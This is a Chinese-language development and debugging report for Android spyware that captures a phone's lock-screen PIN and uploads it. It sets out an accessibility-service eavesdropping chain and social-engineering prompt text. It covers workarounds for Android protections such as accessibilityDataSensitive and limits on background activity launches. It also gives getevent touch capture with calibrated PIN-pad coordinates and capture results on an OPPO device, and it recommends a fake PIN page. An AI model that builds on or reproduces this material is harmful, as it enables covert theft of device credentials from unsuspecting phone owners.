
# PIN 获取调试报告与问题分析

## 1. 测试环境

| 设备 | OPPO PGFM10 | 华为 FOA-AL60 |
|------|-------------|---------------|
| Android | 16 (API 36) | 12 (API 31) |
| 系统 | ColorOS 16 | EMUI 14.2.0 |
| 分辨率 | 1240x2772 | 1084x2412 |
| 序列号 | — | 2TV9K24710071129 |
| WiFi IP | 192.168.31.243 | 192.168.31.162 |

## 2. Vendor 原始 PIN 获取方案

### 2.1 完整链路

```
ConfirmDeviceActivity.onResume()
  → 注册 ConfirmDeviceCredentialDelegate (12 个 ListenWindow)
  → BiometricPrompt.authenticate() 弹出系统真实 PIN 对话框

用户输入 PIN → AccessibilityEvent 产生
  → MyAccessibilityService.onAccessibilityEvent()
  → DelegateEventDispatcher case 0: 匹配 ListenWindow
    → listenWindow.equals() 检查 package/class
    → p(listenWindow, source) 检查 matchs
    → e(listenWindow, event) 处理 EventSubscribe
      → r(eventSubscribe, source) 搜索匹配节点
      → x(eventSubscribe, nodeList, beforeText, eventText) 收集属性
      → CrackLockCipherPlug.cacheListenResponse() 缓存

BiometricAuthCallback.onAuthenticationSucceeded()
  → notifyCredentialResult()
  → CrackLockCipherPlug.startMonitoring()
  → PinCodeCollector.analyzeAndUpload()
    → extractPinFromIds() / mergeTextCipher()
    → SharedPrefsManager.C() + HttpApiManager.uploadLockCipher()
```

### 2.2 EventSubscribe 数据收集方式

| Subscribe | 监听对象 | 事件类型 | 属性 |
|-----------|---------|---------|------|
| N(pkg) lockPasswordEdit | EditText | TEXT_CHANGED(16), TEXT_SELECTION_CHANGED(8192) | text |
| O(pkg) lockPattern | lockPattern View | 32, 2048, 16384 | boundsInScreen, boundsInParent, GESTURE_POINTS |
| P(pkg) oppoLockPattern | biometric_lockPattern View | 32, 2048, 16384 | boundsInScreen, boundsInParent, GESTURE_POINTS |
| Q(pkg) useCredential | button_use_credential TextView | 32, 2048, 16384 | (auto-click) |

### 2.3 PIN 破解策略

| 策略 | 方法 | 匹配的 ID 格式 |
|------|------|---------------|
| 通用 PIN | `extractPinFromIds()` | `com.android.systemui:id/key0~key9` |
| Vivo PIN | `extractPinFromIds()` | `com.android.systemui:id/VivoPinkey*` |
| Vivo 文本 | `extractPinFromIds()` | `com.android.systemui:id/num*`, `char_*` |
| 文本合并 | `mergeTextCipher()` | 星号填充算法合并 EditText 文本片段 |

## 3. OPPO 测试结果

### 3.1 ConfirmDeviceActivity 启动 ✅

- BiometricPrompt 成功弹出
- 社工文案正确显示: "验证个人身份" / "隐私保护"
- `ConfirmDeviceCredentialDelegate` 已注册

### 3.2 PIN pad UI 分析

OPPO ColorOS 16 BiometricPrompt 有两种模式:

**初始模式 (6 位 PIN pad)**:
- `com.android.systemui:id/pinSimpleLock` — 完全自绘 View
- `com.android.systemui:id/coui_lock_screen_pwd_input_view` — OPPO 自定义 ViewGroup
- `content-desc="密码栏，已输入 0 个值，共 6 个值"`
- **无任何数字键 accessibility 节点** (无 key0~key9)
- **无 EditText** (无 TEXT_CHANGED 事件)

**错误后切换模式 (文本密码)**:
- `com.android.systemui:id/lockPassword` — EditText (NAF=true, password=true)
- `com.android.systemui:id/checkbox_password` — 显示密码 checkbox

### 3.3 Vendor 方案失败原因

1. **EventSubscribe N() 匹配失败**: 初始 PIN pad 模式无 EditText，无 TEXT_CHANGED 事件
2. **extractPinFromIds() 失败**: 无 `key0~key9` 节点 ID (OPPO 自绘控件)
3. **p() matchs 验证失败** (已修复): Android 16 `accessibilityDataSensitive` 导致 tree search 返回 false
4. **lockPassword NAF**: 切换到文本模式后 EditText 标记 `NAF=true`，accessibility 不暴露输入文本
5. **Log.e() 被过滤**: ColorOS 16 过滤第三方 app 的所有日志级别

### 3.4 已实施的修复

| 修复 | 文件 | 说明 |
|------|------|------|
| `p()` matchs bypass | `AccessibilityDelegate.java` | 与 `q()` 相同，跳过 matchs 失败 |
| `ConfirmDeviceCredentialDelegate` 注册 | `ConfirmDeviceActivity.java` | 修复被跳过的 delegate 注册 |
| OPPO getevent 坐标捕获 | `OppoPinPadCapture.java` | 通过 ADB getevent 捕获内核触摸事件 |
| BiometricAuthCallback 集成 | `BiometricAuthCallback.java` | 认证成功后解析并保存 PIN |

## 4. 华为测试结果

### 4.1 后台 Activity 启动限制

华为 EMUI 14 严格执行后台 Activity 启动限制:
- `context.startActivity()` 从 HTTP 线程 → **FAIL** (Background activity start)
- `svc.startActivity()` 从无障碍服务上下文 → **FAIL** (callingUidProcState: BOUND_FOREGROUND_SERVICE)
- Full-screen Intent notification → **FAIL** (需要 USE_FULL_SCREEN_INTENT 权限)
- `adb shell am start` → **成功** (需要 exported=true)

**解决方案**: 临时将 `ConfirmDeviceActivity` 设为 `exported=true`，通过 ADB 启动。
生产环境需要通过 app 前台触发 (如保活引擎结束后) 或使用 PendingIntent alarm。

### 4.2 PIN pad UI 分析

华为 EMUI 14 BiometricPrompt 显示**文本密码输入框** (非 6 位 PIN pad):
- `com.android.systemui:id/lockPassword` — EditText (NAF=true, password=true, focused=true)
- 系统键盘弹出
- 总计仅 8 个 accessibility 节点

### 4.3 Vendor 方案失败原因

1. **lockPassword NAF=true**: EditText 标记 Not Accessibility Friendly，系统不通过 accessibility 事件暴露输入文本
2. **password=true**: 密码字段的文本内容被系统隐藏
3. **日志完全被过滤**: 华为 EMUI 14 过滤所有第三方 app 日志 (包括 Log.e())
4. **PIN 未保存**: `/showConfirmLock` 返回 `count: 0`

## 5. getevent 坐标捕获方案 (OPPO)

### 5.1 方案原理

通过 ADB shell 运行 `getevent` 捕获 Linux 内核级触摸事件，完全绕过 Android accessibility 安全限制。

```
getevent -t /dev/input/event2  →  原始触摸坐标
  → ABS_MT_POSITION_X (0035)
  → ABS_MT_POSITION_Y (0036)
  → BTN_TOUCH DOWN (014a 00000001)
```

### 5.2 触摸屏参数 (OPPO PGFM10)

| 参数 | 值 |
|------|-----|
| 设备路径 | `/dev/input/event2` (touchpanel) |
| ABS_MT_POSITION_X max | 12399 |
| ABS_MT_POSITION_Y max | 27719 |
| 屏幕映射 | rawX * 1240 / 12400, rawY * 2772 / 27720 |

### 5.3 PIN pad 网格标定数据

从实测 (用户按 1~9) 获得:

```
数字 1: screen(407, 1885)    数字 2: screen(733, 1878)    数字 3: screen(931, 1910)
数字 4: screen(368, 2071)    数字 5: screen(736, 2048)    数字 6: screen(958, 2065)
数字 7: screen(385, 2252)    数字 8: screen(664, 2256)    数字 9: screen(923, 2266)
```

计算网格参数:
```
三列 X 中心: 左=387  中=711  右=937
四行 Y 中心: 行1=1891  行2=2061  行3=2258  行4=2442(推算)
```

比例坐标 (占屏幕百分比):
```
COL: 31.2%  57.3%  75.6%
ROW: 68.2%  74.3%  81.5%  88.1%
```

反向映射验证: 9/9 全部正确 ✅

### 5.4 实际捕获结果

| 测试 | 用户输入 | 捕获结果 | 准确度 |
|------|---------|---------|--------|
| 测试 1 (标定) | 1~9 | 9 个点全部正确映射 | ✅ |
| 测试 2 | 正确 PIN | `12345614725` (11 touches) | ❌ 多余触摸 |
| 测试 3 | 正确 PIN (5位) | `12345` (5 touches) | ✅ |
| 测试 4 | `123456` + `147258` | `12345` (5 touches) | ❌ 丢失触摸 |

### 5.5 精度问题分析

1. **多余触摸**: BiometricPrompt 弹出/关闭时的触摸被包含在捕获数据中
2. **丢失触摸**: 6 位 PIN 输入后系统自动验证并关闭对话框，最后几位可能在 getevent 停止前未写入文件
3. **getevent 输出缓冲**: nohup 后台进程的输出缓冲可能导致数据不完整
4. **时间窗口不精确**: getevent 启动 → BiometricPrompt 显示之间有延迟

### 5.6 待优化方向

1. **时间戳过滤**: getevent 输出包含内核时间戳，可与 BiometricPrompt 显示/关闭时间对比，精确截取有效输入窗口
2. **content-desc 校验**: 监控 `content-desc="密码栏，已输入 N 个值"` 的变化次数，与触摸次数交叉验证
3. **getevent 刷新频率**: 使用 `-c` 参数控制读取条数，或用管道实时处理避免缓冲丢失
4. **动态聚类改进**: 当前 K-Means 需要 6+ 触摸点，可降低阈值或用自适应算法
5. **多次采样合并**: 触发多次 ConfirmDeviceActivity，合并多次 PIN 输入结果取交集

## 6. 实现文件清单

### 6.1 新增文件

| 文件 | 说明 |
|------|------|
| `plug/OppoPinPadCapture.java` | getevent 坐标捕获 + 动态聚类/比例映射 |

### 6.2 修改文件

| 文件 | 修改内容 |
|------|---------|
| `activity/ConfirmDeviceActivity.java` | 注册 ConfirmDeviceCredentialDelegate + 启动 getevent 捕获 |
| `biometric/BiometricAuthCallback.java` | 认证成功后调用 OppoPinPadCapture 解析 PIN |
| `delegate/AccessibilityDelegate.java` | `p()` matchs bypass (与 `q()` 一致) |
| `AndroidManifest.xml` | ConfirmDeviceActivity exported=true (调试用) |
| `server/ApiRouter.java` | 添加 `/testConfirmDevice` `/testPinCapture` `/testPinResult` 测试端点 |

## 7. 结论

### 7.1 现代 Android 的安全防护

| 安全机制 | Android 版本 | 影响 |
|---------|-------------|------|
| `accessibilityDataSensitive` | 13+ (API 33) | 敏感控件不向非系统 accessibility 服务发送事件 |
| `NAF` (Not Accessibility Friendly) | 12+ (API 31) | 密码 EditText 标记为不可访问 |
| `password=true` | 所有版本 | 密码字段文本被隐藏 |
| 后台 Activity 启动限制 | 12+ (API 31) | 华为严格执行，OPPO 相对宽松 |
| 日志过滤 | 厂商特定 | OPPO/华为都过滤第三方 app 日志 |
| 截屏保护 | 厂商特定 | BiometricPrompt 界面禁止截屏 |

### 7.2 各方案可行性

| 方案 | OPPO (API 36) | 华为 (API 31) | 通用性 |
|------|-------------|---------------|--------|
| Vendor 原始 (EditText 窃听) | ❌ | ❌ | 仅 Android 12 以下 |
| getevent 坐标捕获 | ⚠️ 精度问题 | 未测试 (需 ADB) | 需要 ADB shell |
| 假 PIN 页面 (android 项目方案) | ✅ 最可靠 | ✅ 最可靠 | 不依赖系统 PIN pad |
| Vendor getevent + 动态聚类 | ⚠️ 需优化 | 待验证 | 需要 ADB + 标定 |

### 7.3 推荐后续方案

**短期**: 优化 getevent 坐标捕获精度 (时间戳过滤 + content-desc 校验)

**中期**: 实现 android 项目的 `LockCredentialPromptActivity` 假 PIN 页面作为兜底方案

**长期**: 两种方案并行 — getevent 优先 (需 ADB)，假 PIN 页面兜底 (不需 ADB)
